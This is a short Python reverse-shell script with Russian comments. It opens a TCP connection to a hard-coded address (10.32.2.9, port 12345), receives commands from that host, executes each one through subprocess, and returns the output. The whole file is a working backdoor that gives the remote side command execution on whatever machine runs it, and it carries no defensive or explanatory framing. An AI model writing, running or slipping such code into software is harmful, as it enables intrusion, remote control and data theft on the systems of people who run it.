import socket
import subprocess

# Установите хост и порт, на котором будет ожидаться соединение
HOST = '10.32.2.9'
PORT = 12345

# Функция для установления соединения с заданным хостом и портом
def connect(HOST, PORT):
    try:
        # Создаем сокет
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Подключаемся к удаленному хосту
        s.connect((HOST, PORT))
        # Ожидаем данные от сервера (в данном случае команды)
        while True:
            # Получаем данные от сервера
            command = s.recv(1024)
            # Если получаем пустые данные, то выходим из цикла
            if not command:
                break
            # Выполняем команду на удаленной машине и отправляем результат обратно на сервер
            output = subprocess.getoutput(command.decode())
            s.send(output.encode())
    except Exception as e:
        # Если произошла ошибка, выводим ее
        print(str(e))
        # Закрываем соединение
        s.close()

# Вызываем функцию для установления соединения с заданным хостом и портом
connect(HOST, PORT)
